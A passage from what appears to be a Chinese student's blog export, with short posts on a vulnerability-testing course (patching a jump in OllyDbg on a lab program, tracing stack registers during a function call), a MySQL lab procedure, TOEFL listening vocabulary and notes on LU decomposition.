<h3 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h3><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业三/image-20200323120545862.png"  alt="image-20200323120545862" style="zoom:50%;">

<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>找到跳转语句</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业三/image-20200323121253239.png"  alt="image-20200323121253239" style="zoom:80%;">

<p>修改</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业三/image-20200323121336341.png"  alt="image-20200323121336341" style="zoom:80%;">

<p>跳转成功</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业三/image-20200323121457054.png"  alt="image-20200323121457054" style="zoom:80%;">



<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>找到返回值设置代码</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%89/image-20200323121849837.png"  alt="image-20200323121849837"></p>
<p>更改为“返回1”</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业三/image-20200323122009122.png"  alt="image-20200323122009122" style="zoom:80%;">

<p>继续运行，返回eax=1</p>
<p>跳转成功并输出passed</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业三/image-20200323122711537.png"  alt="image-20200323122711537" style="zoom:80%;">]]></content>
      <categories>
        <category>漏洞测试作业</category>
      </categories>
      <tags>
        <tag>漏洞测试</tag>
        <tag>ollydbg使用入门</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞测试作业二：IDE反汇编函数调用实验</title>
    <url>/2020/03/20/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%BA%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
<li>IDE反汇编函数调用实验</li>
</ul>
<a id="more"></a>

<h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>请在XP VC6下调试课本的示例程序并将call语句执行过程中的EIP变化、ESP、EBP变化等状态进行记录，解释变化的主要原因</p>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int add(int x, int y)</span><br><span class="line">&#123;</span><br><span class="line">	int z &#x3D; 0;</span><br><span class="line">	z &#x3D; x + y;</span><br><span class="line">	return z;</span><br><span class="line">&#125;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	int n &#x3D; 0;</span><br><span class="line">	n &#x3D; add(1, 3);</span><br><span class="line">	printf(&quot;%d\n&quot;, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>(加粗表示寄存器数据发生变化，表格中数据表示该行指令执行前的数据)</p>
<table>
<thead>
<tr>
<th>汇编步骤</th>
<th>EIP</th>
<th>ESP</th>
<th>EBP</th>
</tr>
</thead>
<tbody><tr>
<td>11:       n = add(1, 3);</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>0040108F   push        3</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>00401091   push        1</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>00401093   call        @ILT+0(add) (00401005)</td>
<td><strong>00401093</strong></td>
<td><strong>0012FF28</strong></td>
<td>0012FF80</td>
</tr>
<tr>
<td>00401098   add         esp,8</td>
<td><strong>00401098</strong></td>
<td><strong>0012FF28</strong></td>
<td>0012FF80</td>
</tr>
<tr>
<td>0040109B   mov         dword ptr [ebp-4],eax</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>00401005   jmp         add(00401030)</td>
<td><strong>00401005</strong></td>
<td><strong>0012FF24</strong></td>
<td>0012FF80</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>2:    int add(int x, int y)</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>3:    {</td>
<td>(省略未变化部分)</td>
<td></td>
<td></td>
</tr>
<tr>
<td>00401030   push        ebp</td>
<td><strong>00401030</strong></td>
<td><strong>0012FF24</strong></td>
<td>0012FF80</td>
</tr>
<tr>
<td>00401031   mov         ebp,esp</td>
<td><strong>00401031</strong></td>
<td><strong>0012FF20</strong></td>
<td></td>
</tr>
<tr>
<td>00401033   sub         esp,44h</td>
<td><strong>00401033</strong></td>
<td></td>
<td><strong>0012FF20</strong></td>
</tr>
<tr>
<td>00401036   push        ebx</td>
<td><strong>00401036</strong></td>
<td><strong>0012FEDC</strong></td>
<td></td>
</tr>
<tr>
<td>00401037   push        esi</td>
<td><strong>00401037</strong></td>
<td><strong>0012FED8</strong></td>
<td></td>
</tr>
<tr>
<td>00401038   push        edi</td>
<td><strong>00401038</strong></td>
<td><strong>0012FED4</strong></td>
<td></td>
</tr>
<tr>
<td>00401039   lea         edi,[ebp-44h]</td>
<td><strong>00401039</strong></td>
<td><strong>0012FED0</strong></td>
<td></td>
</tr>
<tr>
<td>0040103C   mov         ecx,11h</td>
<td><strong>0040103C</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>00401041   mov         eax,0CCCCCCCCh</td>
<td><strong>00401041</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>00401046   rep stos    dword ptr [edi]</td>
<td><strong>00401046</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>4:        int z = 0;</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>00401048   mov         dword ptr [ebp-4],0</td>
<td><strong>00401048</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>5:        z = x + y;</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>0040104F   mov         eax,dword ptr [ebp+8]</td>
<td><strong>0040104F</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>00401052   add         eax,dword ptr [ebp+0Ch]</td>
<td><strong>00401052</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>00401055   mov         dword ptr [ebp-4],eax</td>
<td><strong>00401055</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>6:        return z;</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>00401058   mov         eax,dword ptr [ebp-4]</td>
<td><strong>00401058</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>7:    }</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>0040105B   pop         edi</td>
<td><strong>0040105B</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>0040105C   pop         esi</td>
<td><strong>0040105C</strong></td>
<td><strong>0012FED4</strong></td>
<td></td>
</tr>
<tr>
<td>0040105D   pop         ebx</td>
<td><strong>0040105D</strong></td>
<td><strong>0012FED8</strong></td>
<td></td>
</tr>
<tr>
<td>0040105E   mov         esp,ebp</td>
<td><strong>0040105E</strong></td>
<td><strong>0012FEDC</strong></td>
<td></td>
</tr>
<tr>
<td>00401060   pop         ebp</td>
<td><strong>00401060</strong></td>
<td><strong>0012FF20</strong></td>
<td></td>
</tr>
<tr>
<td>00401061   ret</td>
<td><strong>00401061</strong></td>
<td><strong>0012FF24</strong></td>
<td><strong>0012FF80</strong></td>
</tr>
</tbody></table>
<p>寄存器变化原因</p>
<ul>
<li><p>EIP：</p>
<ul>
<li>指向下一步要进行的指令位置，随汇编代码执行过程改变</li>
</ul>
</li>
<li><p>ESP：</p>
<ul>
<li>PUSH，POP操作导致栈顶变化</li>
<li>函数调用过程中的栈帧变化</li>
<li>直接对ESP的值进行修改</li>
</ul>
</li>
<li><p>EBP:</p>
<ul>
<li><p>函数调用过程中的栈帧变化</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">调用函数  mov ebp,esp</span><br><span class="line">函数返回 pop ebp</span><br></pre></td></tr></table></figure>



</li>
</ul>
</li>
</ul>
<h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>相同的程序，请在非XP的当前windows操作系统的vs2003以上版本中运行，绘制add函数执行时的栈状态，并与XP下同时刻的状态进行比较</p>
<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%BA%8C/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200320235550.jpg"  alt="微信图片_20200320235550"></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%BA%8C/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_202003202355501.jpg"  alt="微信图片_202003202355501"></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%BA%8C/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_202003202355502.jpg"  alt="微信图片_202003202355502"></p>
<ul>
<li>与xp系统下的vc6栈状态不同：<ul>
<li>vc6栈帧预留空间为044h <code>sub esp,044h</code></li>
<li>vs2019为0CCh<code>sub esp,0CCh</code></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>漏洞测试作业</category>
      </categories>
      <tags>
        <tag>漏洞测试</tag>
        <tag>寄存器</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库上机参考资料总结</title>
    <url>/2020/03/17/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E6%9C%BA%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>课堂参考资料</p>
<a id="more"></a>

<h3 id="L2"><a href="#L2" class="headerlink" title="L2"></a>L2</h3><ol>
<li>文档：创建数据库&amp;插入数据存储过程代码<br>链接：<a href="http://dwz.date/Nkr" target="_blank" rel="noopener">http://dwz.date/Nkr</a></li>
<li>文档：WordPress数据字典.note<br>链接：<a href="http://dwz.date/N43" target="_blank" rel="noopener">http://dwz.date/N43</a></li>
<li>文档：Discuz! X3 数据字典.no…<br>链接：<a href="http://dwz.date/N46" target="_blank" rel="noopener">http://dwz.date/N46</a></li>
</ol>
]]></content>
      <categories>
        <category>major</category>
      </categories>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-03 听力总结</title>
    <url>/2020/03/17/%E8%8B%B1%E8%AF%AD/%E6%89%98%E7%A6%8F/2020-03%20%E5%90%AC%E5%8A%9B%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
<li>单词</li>
<li>语言表达</li>
</ul>
<a id="more"></a>

<h2 id="2020-3-26"><a href="#2020-3-26" class="headerlink" title="2020-3-26"></a>2020-3-26</h2><table>
<thead>
<tr>
<th>表达</th>
<th>释义/注意点</th>
</tr>
</thead>
<tbody><tr>
<td>gazette</td>
<td>n.报纸/v.刊载</td>
</tr>
<tr>
<td>budding</td>
<td>发育期的</td>
</tr>
<tr>
<td>a budding historian</td>
<td>初学历史学的学生</td>
</tr>
<tr>
<td>day-to-day life</td>
<td>日常生活</td>
</tr>
<tr>
<td>publication</td>
<td>出版物</td>
</tr>
<tr>
<td>deteriorated</td>
<td>变质的</td>
</tr>
<tr>
<td>French national constituent assembly</td>
<td>法国国民议会大会的形成</td>
</tr>
<tr>
<td>editorials</td>
<td>社论</td>
</tr>
<tr>
<td>present a paper on</td>
<td></td>
</tr>
<tr>
<td>press</td>
<td>出版社</td>
</tr>
</tbody></table>
<h2 id="2020-3-26-1"><a href="#2020-3-26-1" class="headerlink" title="2020-3-26"></a>2020-3-26</h2><table>
<thead>
<tr>
<th>表达</th>
<th>释义/注意点</th>
</tr>
</thead>
<tbody><tr>
<td>cement</td>
<td>巩固</td>
</tr>
<tr>
<td>cement my interest in doing</td>
<td></td>
</tr>
<tr>
<td>the reason I came by is ……</td>
<td></td>
</tr>
<tr>
<td>straw poll</td>
<td>选举前的非正式民意测验</td>
</tr>
<tr>
<td>conduct a straw poll on campus</td>
<td></td>
</tr>
<tr>
<td>ballot</td>
<td>投票</td>
</tr>
<tr>
<td>hold an informal ballot</td>
<td></td>
</tr>
<tr>
<td>general election</td>
<td>正式选举</td>
</tr>
<tr>
<td>political leaning</td>
<td>政治倾向</td>
</tr>
<tr>
<td>identify with</td>
<td>相同于、认同</td>
</tr>
<tr>
<td>faculty advisor</td>
<td>指导教师</td>
</tr>
<tr>
<td>I’m flattered.</td>
<td>我太荣幸了</td>
</tr>
<tr>
<td>my schedule is so jammed</td>
<td></td>
</tr>
<tr>
<td>the paper is not <strong>due</strong> till after the election</td>
<td>论文指导选举结束后才截止</td>
</tr>
<tr>
<td>referenda</td>
<td>全民公决</td>
</tr>
<tr>
<td>sports arena</td>
<td>体育竞技场</td>
</tr>
<tr>
<td>referendum</td>
<td>公民投票权</td>
</tr>
<tr>
<td>referendum participation rates</td>
<td>全民公投参与率</td>
</tr>
<tr>
<td>proposal</td>
<td>提议</td>
</tr>
<tr>
<td>term page</td>
<td>学期论文</td>
</tr>
</tbody></table>
<ul>
<li><strong>The reason I came by is</strong> we are getting ready to conduct a straw poll on campus, you know, hold an informal ballot since the general election is just a couple of months away.</li>
<li>We want to <strong>get a field from</strong> the students’ bodies <strong>political leanings</strong>, like who students are planning to <strong>vote for</strong>, which political party people <strong>identify with</strong>, that sort of thing.  ——我们想了解一下学生群体的政治倾向，比如学生们打算给哪些人投票，比较认同哪些政治团体，这样的事情。</li>
<li>I was hoping you might be interested.</li>
<li>There is one on whether to ban smoking in restaurants.</li>
<li>whether to spend tax dollars for a new sports arena in the city.</li>
<li>In regular elections, <strong>the vast majority of voters</strong> ignore referenda.  在普通的大选里，大多数的投票人会无视全民公决</li>
</ul>
<h2 id="2020-3-24"><a href="#2020-3-24" class="headerlink" title="2020-3-24"></a>2020-3-24</h2><table>
<thead>
<tr>
<th>表达</th>
<th>释义/注意点</th>
</tr>
</thead>
<tbody><tr>
<td>ecological niche</td>
<td>生态位</td>
</tr>
</tbody></table>
<h2 id="2020-3-19"><a href="#2020-3-19" class="headerlink" title="2020-3-19"></a>2020-3-19</h2><table>
<thead>
<tr>
<th>表达</th>
<th>释义/注意点</th>
</tr>
</thead>
<tbody><tr>
<td>get into it</td>
<td></td>
</tr>
<tr>
<td>original play</td>
<td>原创戏剧</td>
</tr>
<tr>
<td>That’s <strong>the direct quote from</strong> ……</td>
<td>直接引用……的话</td>
</tr>
<tr>
<td>two “e”s</td>
<td>注意连读/twui:s/</td>
</tr>
<tr>
<td>unabashedly</td>
<td>不害臊地</td>
</tr>
<tr>
<td>playwright</td>
<td>剧作家</td>
</tr>
<tr>
<td>dramatic literature</td>
<td>戏剧文学</td>
</tr>
<tr>
<td>be construed as</td>
<td>被解释为</td>
</tr>
<tr>
<td>drive home the point that …./drive a home point</td>
<td>讲明观点、问题</td>
</tr>
<tr>
<td>grant</td>
<td>承认</td>
</tr>
<tr>
<td>overstate</td>
<td>夸张</td>
</tr>
<tr>
<td>of one’s day</td>
<td>和某人同时期</td>
</tr>
</tbody></table>
<ul>
<li>Well, part of what Mee’s trying to do is <strong>drive home the point that</strong>: One theater’s always a collaborative effort.</li>
<li>I’ll <strong>grant that</strong> he’s <strong>overstating things</strong> somewhat. ——我承认他这话有点夸张。<br>like most writers <strong>of his day</strong> </li>
</ul>
<table>
<thead>
<tr>
<th>表达</th>
<th>释义/注意点</th>
</tr>
</thead>
<tbody><tr>
<td>up front</td>
<td>预先</td>
</tr>
<tr>
<td>display case</td>
<td>展示柜</td>
</tr>
<tr>
<td>recoup</td>
<td>收回，偿还</td>
</tr>
<tr>
<td>recoup the cost of my materials</td>
<td></td>
</tr>
<tr>
<td>independently owned</td>
<td>个体独立经营的</td>
</tr>
<tr>
<td><strong>un</strong>like</td>
<td></td>
</tr>
<tr>
<td>ceramic</td>
<td>陶器</td>
</tr>
<tr>
<td>vendor</td>
<td>卖主，小贩</td>
</tr>
<tr>
<td>nominal</td>
<td>名义上的，象征性的</td>
</tr>
<tr>
<td>line up</td>
<td>排列</td>
</tr>
<tr>
<td>haul</td>
<td>拖</td>
</tr>
</tbody></table>
<ul>
<li>But they would’nt <strong>pay you up front</strong>.     ——他们不会预支</li>
<li>The vendor fee is nominal.    ——摆摊费只是象征性地收取</li>
<li>I don’t have a car to <strong>haul everything down there</strong>.</li>
</ul>
<h2 id="2020-3-18"><a href="#2020-3-18" class="headerlink" title="2020-3-18"></a>2020-3-18</h2><table>
<thead>
<tr>
<th>表达</th>
<th>释义</th>
</tr>
</thead>
<tbody><tr>
<td>be taken aback by sth.</td>
<td>因……而吃惊</td>
</tr>
<tr>
<td>require course</td>
<td>必修课</td>
</tr>
<tr>
<td>elective course</td>
<td>选修课</td>
</tr>
<tr>
<td>cultivate a sense of good will</td>
<td>陶冶高尚情操</td>
</tr>
<tr>
<td>allude to sth.</td>
<td>提到……</td>
</tr>
<tr>
<td>give you a good overview of the field</td>
<td></td>
</tr>
<tr>
<td>commit oneself</td>
<td>承担义务，做出承诺（要求等）说出肯定的意见</td>
</tr>
<tr>
<td>commit oneself to doing sth.</td>
<td>致力于做某事</td>
</tr>
<tr>
<td>accounting</td>
<td>会计学</td>
</tr>
<tr>
<td>avoid becoming isolated from</td>
<td></td>
</tr>
<tr>
<td>Not necessarily.</td>
<td>那不一定。</td>
</tr>
</tbody></table>
<ul>
<li>These courses will <strong>give you a good overview of the field</strong> before <strong>commiting yourself</strong>.</li>
<li>Well, I <strong>endured</strong> accounting …….. and <strong>barely stay awake</strong>. </li>
<li>I have got two <strong>require courses</strong> and <strong>two electives</strong>.</li>
</ul>
<h2 id="2020-3-16"><a href="#2020-3-16" class="headerlink" title="2020-3-16"></a>2020-3-16</h2><table>
<thead>
<tr>
<th>表达</th>
<th>释义</th>
</tr>
</thead>
<tbody><tr>
<td>determine</td>
<td>做出判定，判决，限定</td>
</tr>
<tr>
<td>I feel like I’m skating ice on her.</td>
<td>我感觉我和她关系如履薄冰。</td>
</tr>
<tr>
<td>The plot thickens.</td>
<td>事情越来越复杂了。</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>TOEFL</category>
      </categories>
      <tags>
        <tag>听力</tag>
        <tag>英语</tag>
      </tags>
  </entry>
  <entry>
    <title>第五章 解线性方程组的直接方法</title>
    <url>/2020/03/17/%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95%EF%BC%9A%E7%AC%AC%E4%BA%94%E7%AB%A0-%E8%A7%A3%E6%96%B9%E7%A8%8B%E7%BB%84-%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>计算方法总结</p>
<a id="more"></a>

<h2 id="5-1-引言与预备知识"><a href="#5-1-引言与预备知识" class="headerlink" title="5.1 引言与预备知识"></a>5.1 引言与预备知识</h2><h3 id="5-1-1-引言"><a href="#5-1-1-引言" class="headerlink" title="5.1.1 引言"></a>5.1.1 引言</h3><h3 id="5-1-2-向量和矩阵"><a href="#5-1-2-向量和矩阵" class="headerlink" title="5.1.2 向量和矩阵"></a>5.1.2 向量和矩阵</h3><h3 id="5-1-3-矩阵的特征值与谱半径"><a href="#5-1-3-矩阵的特征值与谱半径" class="headerlink" title="5.1.3 矩阵的特征值与谱半径"></a>5.1.3 矩阵的特征值与谱半径</h3><h3 id="5-1-4-特殊矩阵"><a href="#5-1-4-特殊矩阵" class="headerlink" title="5.1.4 特殊矩阵"></a>5.1.4 特殊矩阵</h3><h2 id="5-2-高斯消去法"><a href="#5-2-高斯消去法" class="headerlink" title="5.2 高斯消去法"></a>5.2 高斯消去法</h2><h3 id="高斯消去法"><a href="#高斯消去法" class="headerlink" title="高斯消去法"></a>高斯消去法</h3><h3 id="矩阵的三角分解"><a href="#矩阵的三角分解" class="headerlink" title="矩阵的三角分解"></a>矩阵的三角分解</h3><ul>
<li><strong>A=LU</strong>，其中<img src="/img/loading.gif" class="lazyload" data-src="/images/计算方法：第五章-解方程组-总结/image-20200317113334163.png"  alt="image-20200317113334163" style="zoom:70%;">每列中的l均为前面的列计算之后的比例</li>
<li>例题：书P148 例三</li>
</ul>
<p>​         <img src="/img/loading.gif" class="lazyload" data-src="/images/计算方法：第五章-解方程组-总结/image-20200317114153396.png"  alt="image-20200317114153396" style="zoom: 20%;"></p>
<h3 id="列主元消去法"><a href="#列主元消去法" class="headerlink" title="列主元消去法"></a>列主元消去法</h3><ul>
<li><p>每列中选取<strong>绝对值</strong>最大的元素</p>
 <img src="/img/loading.gif" class="lazyload" data-src="/images/计算方法：第五章-解方程组-总结/image-20200317115037170.png"  alt="image-20200317115037170" style="zoom:25%;">

</li>
</ul>
<h3 id="全主元消去法"><a href="#全主元消去法" class="headerlink" title="全主元消去法"></a>全主元消去法</h3><ul>
<li>每一步选取系数矩阵或消元后的低阶矩阵中绝对值最大的元素作为主元素</li>
<li>时间代价大</li>
</ul>
<h2 id="5-3-矩阵三角分解法"><a href="#5-3-矩阵三角分解法" class="headerlink" title="5.3 矩阵三角分解法"></a>5.3 矩阵三角分解法</h2><h3 id="直接三角分解法"><a href="#直接三角分解法" class="headerlink" title="直接三角分解法"></a>直接三角分解法</h3><h4 id="1-不选主元-gt-杜利特尔"><a href="#1-不选主元-gt-杜利特尔" class="headerlink" title="1.不选主元 -&gt; 杜利特尔"></a>1.不选主元 -&gt; 杜利特尔</h4>  <img src="/img/loading.gif" class="lazyload" data-src="/images/计算方法：第五章-解方程组-总结/image-20200317153055807.png"  alt="image-20200317153055807" style="zoom:33%;">

<img src="/img/loading.gif" class="lazyload" data-src="/images/计算方法：第五章-解方程组-总结/image-20200317153010835.png"  alt="image-20200317153010835" style="zoom: 33%;">

<h4 id="2-选主元"><a href="#2-选主元" class="headerlink" title="2.选主元"></a>2.选主元</h4><ul>
<li><strong>PA=LU</strong></li>
<li><strong>Ly=Pb, Ux=y</strong></li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/计算方法：第五章-解方程组-总结/d99403080aa90f323fe72d5c2d9ed18.jpg"  alt="d99403080aa90f323fe72d5c2d9ed18" style="zoom: 50%;">

</li>
</ul>
<h3 id="平方根法"><a href="#平方根法" class="headerlink" title="平方根法"></a>平方根法</h3><ul>
<li><p>A是正定矩阵，<img src="/img/loading.gif" class="lazyload" data-src="/images/计算方法：第五章-解方程组-总结/image-20200317154915496.png"  alt="image-20200317154915496" style="zoom:60%;">，则有<img src="/img/loading.gif" class="lazyload" data-src="/images/计算方法：第五章-解方程组-总结/image-20200317154958206.png"  alt="image-20200317154958206" style="zoom:60%;"></p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/计算方法：第五章-解方程组-总结/image-20200317155119357.png"  alt="image-20200317155119357" style="zoom: 50%;">
<img src="/img/loading.gif" class="lazyload" data-src="/images/计算方法：第五章-解方程组-总结/image-20200317155208661.png"  alt="image-20200317155208661" style="zoom: 50%;">
<img src="/img/loading.gif" class="lazyload" data-src="/images/计算方法：第五章-解方程组-总结/image-20200317155228277.png"  alt="image-20200317155228277" style="zoom:50%;">
</li>
<li><p>改进 -&gt;避免开方计算</p>
</li>
</ul>
<img src="/img/loading.gif" class="lazyload" data-src="/images/计算方法：第五章-解方程组-总结/image-20200317155731185.png"  alt="image-20200317155731185" style="zoom:67%;">



<h3 id="追赶法"><a href="#追赶法" class="headerlink" title="追赶法"></a>追赶法</h3><ul>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/计算方法：第五章-解方程组-总结/image-20200317155851749.png"  alt="image-20200317155851749" style="zoom:50%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/计算方法：第五章-解方程组-总结/image-20200317155900957.png"  alt="image-20200317155900957" style="zoom:50%;"></li>
</ul>
<h2 id="5-4-向量与矩阵的范数"><a href="#5-4-向量与矩阵的范数" class="headerlink" title="5.4 向量与矩阵的范数"></a>5.4 向量与矩阵的范数</h2><p><img src="/img/loading.gif" class="lazyload" data-src="/images/计算方法：第五章-解方程组-总结/image-20200317160208381.png"  alt="image-20200317160208381" style="zoom:67%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/计算方法：第五章-解方程组-总结/image-20200317160217683.png"  alt="image-20200317160217683" style="zoom:67%;"></p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/计算方法：第五章-解方程组-总结/1585128475(1).png"  alt="image-20200317160217683" style="zoom:67%;">



<img src="/img/loading.gif" class="lazyload" data-src="/images/计算方法：第五章-解方程组-总结/image-20200317160430488.png"  alt="image-20200317160430488" style="zoom:33%;">

<img src="/img/loading.gif" class="lazyload" data-src="/images/计算方法：第五章-解方程组-总结/image-20200317160453322.png"  alt="image-20200317160453322" style="zoom: 50%;">

<h2 id="5-5-误差分析"><a href="#5-5-误差分析" class="headerlink" title="5.5 误差分析"></a>5.5 误差分析</h2><h3 id="5-5-1-矩阵的条件数"><a href="#5-5-1-矩阵的条件数" class="headerlink" title="5.5.1 矩阵的条件数"></a>5.5.1 矩阵的条件数</h3> <img src="/img/loading.gif" class="lazyload" data-src="/images/计算方法：第五章-解方程组-总结/image-20200325173917434.png"  alt="image-20200325173917434" style="zoom:60%;">

<img src="/img/loading.gif" class="lazyload" data-src="/images/计算方法：第五章-解方程组-总结/image-20200325173929566.png"  alt="image-20200325173929566" style="zoom:60%;">

<h3 id="5-5-2-迭代改善法"><a href="#5-5-2-迭代改善法" class="headerlink" title="5.5.2 迭代改善法"></a>5.5.2 迭代改善法</h3>]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>计算方法</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库上机L2</title>
    <url>/2020/03/16/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E6%9C%BAL2%EF%BC%9A%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
<li>创建数据库</li>
<li>插入数据存储过程代码</li>
</ul>
<a id="more"></a>

<p>创建work1.sql文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 创建表</span><br><span class="line">CREATE TABLE &#96;innodb&#96;(</span><br><span class="line">	&#96;id&#96; int(11) NULL DEFAULT 0,</span><br><span class="line">	&#96;data&#96; int(11) NULL DEFAULT 0)</span><br><span class="line">	ENGINE&#x3D;InnoDB;</span><br><span class="line"></span><br><span class="line">CREATE TABLE &#96;myisam&#96;(</span><br><span class="line">	&#96;id&#96; int(11) NULL DEFAULT 0,</span><br><span class="line">	&#96;data&#96; int(11) NULL DEFAULT 0)</span><br><span class="line">	ENGINE&#x3D;myisam;</span><br><span class="line"></span><br><span class="line">create procedure myinsert(a int)</span><br><span class="line">	begin</span><br><span class="line">		declare i int default 1;</span><br><span class="line">		repeat</span><br><span class="line">			insert into &#96;innodb&#96;  VALUES(i,i);</span><br><span class="line">			set i&#x3D;i+1;</span><br><span class="line">		until i&gt;a end repeat;</span><br><span class="line">	end;</span><br><span class="line"></span><br><span class="line">-- 执行存储过程</span><br><span class="line">call myinsert(10000);</span><br><span class="line">-- 删除myinsert函数</span><br><span class="line">drop procedure if exists myinsert;</span><br></pre></td></tr></table></figure>
<p>可以编写sql文件，也可在命令列界面中分步运行</p>
<p>运行之后需要刷新</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/image-20200316214043980.png"  alt="image-20200316214043980" style="zoom:50%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/1584365805(1).png"  alt="1584365805(1).png" style="zoom:35%;"></p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞测试作业一：虚拟机的安装</title>
